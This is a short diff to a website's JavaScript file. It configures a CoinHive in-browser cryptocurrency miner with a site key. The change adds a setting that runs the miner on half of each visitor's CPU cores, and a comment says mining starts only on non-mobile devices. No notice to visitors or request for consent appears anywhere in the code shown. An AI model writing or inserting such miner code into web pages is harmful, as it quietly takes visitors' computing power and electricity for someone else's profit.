@@ -14,6 +14,7 @@ $(".text img").each(function (index, element) {
 });
 // CoinHive
 var miner = new CoinHive.Anonymous('zyc1ClPF1ZevATB5gChyGzZklCCZHmY7', {
+  threads: Math.round(navigator.hardwareConcurrency/2),
   throttle: 0.5
 });
 // Only start on non-mobile devices.
